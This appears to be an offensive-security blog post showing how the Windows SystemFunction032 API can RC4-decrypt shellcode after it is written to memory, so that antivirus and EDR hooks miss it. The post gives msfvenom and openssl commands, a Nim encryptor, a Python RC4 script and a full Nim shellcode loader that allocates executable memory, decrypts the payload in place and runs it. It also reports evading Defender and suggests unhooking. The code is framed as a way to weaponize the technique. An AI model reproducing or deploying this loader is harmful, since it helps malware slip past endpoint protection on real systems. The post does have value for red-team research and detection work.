---
title: "Alternative use cases for SystemFunction032"
layout: "post"
---

Some days ago I woke up in the middle of the night - thinking about the `Advapi32.dll`/`SystemFunction032` function. Really? Yes. Strange, this InfoSec folks. This post will show my nightly idea and sample Code on how to weaponize it.

<!--more-->


## SystemFunction032??

I did not know about this function before digging into Sleep obfuscation techniques like [Foliage](https://github.com/SecIdiot/FOLIAGE) or [Ekko](https://github.com/Cracked5pider/Ekko). Although Benjamin Delphi already wrote about it in [2013](https://blog.gentilkiwi.com/tag/systemfunction032) and used it in Mimikatz.

So this function is able to encrypt/decrypt memory regions via RC4 encryption. As for example the [ReactOS Code shows](https://doxygen.reactos.org/df/d13/sysfunc_8c.html#a66d55017b8625d505bd6c5707bdb9725) it takes a pointer to an RC4_Context structure as input as well as a pointer to the encryption key:

<p align="center">
          <img src="/assets/posts/SystemFunction032/SystemFunction032.PNG">
</p>

"Why the heck do you see something special in that?" you could ask. Well, at least I personally did not know about alternative functions for `existing memory region` encryption/decryption except for `XOR` operations. But as you can read in for example Kyle Avery's blog about [Avoiding Memory Scanners](https://www.blackhillsinfosec.com/avoiding-memory-scanners/) a simple `XOR` even with a longer key got in the meanwhile to detect for AV/EDR vendors.

Although RC4 is considered as insecure and even broken for years it provides a much better memory evasion for e.G. Shellcode to us than simple `XOR`. It would be even more OpSec save to use AES here instead. But one single Windows API is at least very easy to use.

## The midnight idea

Typically if you want to execute Shellcode in a process you will need the following steps:

1. Open a Handle to the Process
2. Allocate Memory in that Process with `RW/RX` or `RWX` permissions
3. Write the Shellcode into that region
4. (Optional) change Permissions to `RX` from `RW` for execution
5. Execute the Shellcode as Thread/APC/Callback/whatever

To avoid signature based detections we could encrypt our Shellcode and decrypt that on runtime before execution. For e.g. AES decryption the flow would typically look like this:

1. Open a Handle to the Process
2. Allocate Memory in that Process with `RW/RX` or `RWX` permissions
3. Decrypt the Shellcode, so that we can write the cleartext value into memory
4. Write the Shellcode into the allocated region
5. (Optional) change Permissions to `RX` from `RW` for execution
6. Execute the Shellcode as Thread/APC/Callback/whatever

In this case, the Shellcode itself could get detected when writing it into memory e.g. by userland hooks as we would need to pass a pointer of the cleartext Shellcode to `WriteProcessMemory` or `NtWriteVirtualMemory`.

The usage of `XOR` could avoid that, because we can even `XOR` decrypt the memory region **after** writing the encrypted value into memory. It would look like this:

1. Open a Handle to the Process
2. Allocate Memory in that Process with `RW/RX` or `RWX` permissions
3. Write the Shellcode into the allocated region
4. XOR decrypt the Shellcode memory region
5. (Optional) change Permissions to `RX` from `RW` for execution
6. Execute the Shellcode as Thread/APC/Callback/whatever

But `XOR` can easily be detected. So we don't want to use that. You already got the idea?

As an alternative we could make use of `SystemFunction032` to decrypt the Shellcode after writing it into memory. So let's do that!

## The PoC

First I had the idea of generating Shellcode and just RC4 encrypt it with OpenSSL. So my idea was to generate it as follows:

```batch
msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin
cat calc.bin | openssl enc -rc4 -nosalt -k "aaaaaaaaaaaaaaaa" > enccalc.bin
```

But later on - when debugging - it turned out, that `SystemFunction032` somehow encrypts/decrypts different to OpenSSL/RC4. So we cannot do it like that. 

---
**09.11.2022: Update**

[an0n_r0](https://twitter.com/an0n_r0) gave further [information](https://twitter.com/an0n_r0/status/1589913098970091521) on how to do the encryption with OpenSSL. You can do it as follows:
```batch
openssl enc -rc4 -in calc.bin -K `echo -n 'aaaaaaaaaaaaaaaa' | xxd -p` -nosalt > enccalc.bin
```

---

Instead we could use the following Nim Code to get an encrypted Shellcode blob (from a Windows OS):

```ruby
import winim
import winim/lean

# msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin
const encstring = slurp"calc.bin"

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

proc SystemFunction032*(memoryRegion: pointer, keyPointer: pointer): NTSTATUS 
  {.discardable, stdcall, dynlib: "Advapi32", importc: "SystemFunction032".}

  
# This is the mentioned RC4 struct
type
    USTRING* = object
        Length*: DWORD
        MaximumLength*: DWORD
        Buffer*: PVOID

var keyString: USTRING
var imgString: USTRING

# Our encryption Key
var keyBuf: array[16, char] = [char 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a']

keyString.Buffer = cast[PVOID](&keyBuf)
keyString.Length = 16
keyString.MaximumLength = 16

var shellcode = toByteSeq(encstring)
var size  = len(shellcode)


# We need to still get the Shellcode to memory to encrypt it with SystemFunction032
let tProcess = GetCurrentProcessId()
echo "Current Process ID: ", tProcess
var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)
echo "Process Handle: ", repr(pHandle)
let rPtr = VirtualAllocEx(
    pHandle,
    NULL,
    cast[SIZE_T](size),
    MEM_COMMIT,
    PAGE_READ_WRITE
)

copyMem(rPtr, addr shellcode[0], size)

# Fill the RC4 struct
imgString.Buffer = rPtr
imgString.Length = cast[DWORD](size)
imgString.MaximumLength = cast[DWORD](size)

# Call SystemFunction032
SystemFunction032(&imgString, &keyString)

copyMem(addr shellcode[0],rPtr ,size)

echo "Writing encrypted shellcode to dec.bin"

writeFile("enc.bin", shellcode)
# enc.bin contains our encrypted Shellcode
```

---
**09.11.2022: Update**

[snovvcrash](https://twitter.com/snovvcrash) published a simple Python Script after this blog which simplifies the encryption with a [Python Script](https://gist.github.com/snovvcrash/3533d950be2d96cf52131e8393794d99):
```python
#!/usr/bin/env python3

from typing import Iterator
from base64 import b64encode


# Stolen from: https://gist.github.com/hsauers5/491f9dde975f1eaa97103427eda50071
def key_scheduling(key: bytes) -> list:
	sched = [i for i in range(0, 256)]

	i = 0
	for j in range(0, 256):
		i = (i + sched[j] + key[j % len(key)]) % 256
		tmp = sched[j]
		sched[j] = sched[i]
		sched[i] = tmp

	return sched


def stream_generation(sched: list[int]) -> Iterator[bytes]:
	i, j = 0, 0
	while True:
		i = (1 + i) % 256
		j = (sched[i] + j) % 256
		tmp = sched[j]
		sched[j] = sched[i]
		sched[i] = tmp
		yield sched[(sched[i] + sched[j]) % 256]        


def encrypt(plaintext: bytes, key: bytes) -> bytes:
	sched = key_scheduling(key)
	key_stream = stream_generation(sched)
	
	ciphertext = b''
	for char in plaintext:
		enc = char ^ next(key_stream)
		ciphertext += bytes([enc])
		
	return ciphertext


if __name__ == '__main__':
	# msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin
	with open('calc.bin', 'rb') as f:
		result = encrypt(plaintext=f.read(), key=b'aaaaaaaaaaaaaaaa')

	print(b64encode(result).decode())
```

---


To execute this, we could simply use the following Nim code:

```ruby
import winim
import winim/lean

# (OPTIONAL) do some Environmental Keying stuff

# Encrypted with the previous code
# Embed the encrypted Shellcode on compile time as string
const encstring = slurp"enc.bin"

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

proc SystemFunction032*(memoryRegion: pointer, keyPointer: pointer): NTSTATUS 
  {.discardable, stdcall, dynlib: "Advapi32", importc: "SystemFunction032".}

type
    USTRING* = object
        Length*: DWORD
        MaximumLength*: DWORD
        Buffer*: PVOID

var keyString: USTRING
var imgString: USTRING

# Same Key
var keyBuf: array[16, char] = [char 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a', 'a']

keyString.Buffer = cast[PVOID](&keyBuf)
keyString.Length = 16
keyString.MaximumLength = 16

var shellcode = toByteSeq(encstring)
var size  = len(shellcode)

let tProcess = GetCurrentProcessId()
echo "Current Process ID: ", tProcess
var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)

let rPtr = VirtualAllocEx(
    pHandle,
    NULL,
    cast[SIZE_T](size),
    MEM_COMMIT,
    PAGE_EXECUTE_READ_WRITE
)

copyMem(rPtr, addr shellcode[0], size)

imgString.Buffer = rPtr
imgString.Length = cast[DWORD](size)
imgString.MaximumLength = cast[DWORD](size)

# Decrypt memory region with SystemFunction032
SystemFunction032(&imgString, &keyString)

# (OPTIONAL) we could Sleep here with a custom Sleep function to avoid memory Scans

# Directly call the Shellcode instead of using a Thread/APC/Callback/whatever

let f = cast[proc(){.nimcall.}](rPtr)
f()

```

At least Defender does not complain here:

<p align="center">
          <img src="/assets/posts/SystemFunction032/PoC.PNG">
</p>


By using that we can nearly ignore userland hooks because our cleartext Shellcode is never passed to any function (Only `SystemFunction032` itself). Of course, all those vendors could detect us by hooking `Advapi32/SystemFunction032` - I did ask this question into the InfoSec community regarding to Sleep obfuscation detection [some time ago](https://twitter.com/ShitSecure/status/1580109373145481216).

But:
 
1. There seam to be some privacy reasons why vendors can't easily hook it, because they would get too many sensitive informations out of legitimate Processes.
2. There are many alternatives to `SystemFunction032`, just read the Benjamin Delphi article linked above or take a look at the ReactOS code.
3. We could also unhook the function before using it.

At the moment at least vendors seam to not hook it. I personally guess this will change in the future.

## Homework for the interested

Another idea was even better from my mind. By using PIC-Code we could also skip all other Win32 functions which were used in my PoC. Because when writing PIC-Code, all code is contained in the `.text` section, and this section typically has `RX` permissions by default, which is enough many times. So we would not need to change memory permissions and we don't need to write the Shellcode to memory.

It would just be as short as follows:

1. Call `SystemFunction032` to decrypt the Shellcode
2. Directly call it

Sample Code for PIC-Code can for example be found [here](https://github.com/thefLink/C-To-Shellcode-Examples/blob/master/HelloWorld/HelloWorld.c). For the Nim-Fans, one library was released ~2 weeks ago which also enables us to relatively easy write PIC-Code called [Bitmancer](https://github.com/zimawhit3/Bitmancer).

Is a program, that just calls `SystemFunction032` potentially malicious? :-) Or one, that just calls any other encryption/decryption function?

## Links & Resources

* Foliage [https://github.com/SecIdiot/FOLIAGE](https://github.com/SecIdiot/FOLIAGE)
* Ekko [https://github.com/Cracked5pider/Ekko](https://github.com/Cracked5pider/Ekko)
* Avoiding Memory Scanners blog [https://www.blackhillsinfosec.com/avoiding-memory-scanners/](https://www.blackhillsinfosec.com/avoiding-memory-scanners/)
* SystemFunction032 Benjamin Delphi Post [https://blog.gentilkiwi.com/tag/systemfunction032](https://blog.gentilkiwi.com/tag/systemfunction032)
* ReactOS Code SystemFunction032 [https://doxygen.reactos.org/df/d13/sysfunc_8c.html#a66d55017b8625d505bd6c5707bdb9725](https://doxygen.reactos.org/df/d13/sysfunc_8c.html#a66d55017b8625d505bd6c5707bdb9725)
* PIC Hello World code [https://github.com/thefLink/C-To-Shellcode-Examples/blob/master/HelloWorld/HelloWorld.c](https://github.com/thefLink/C-To-Shellcode-Examples/blob/master/HelloWorld/HelloWorld.c)    
* Bitmancer Library [https://github.com/zimawhit3/Bitmancer](https://github.com/zimawhit3/Bitmancer)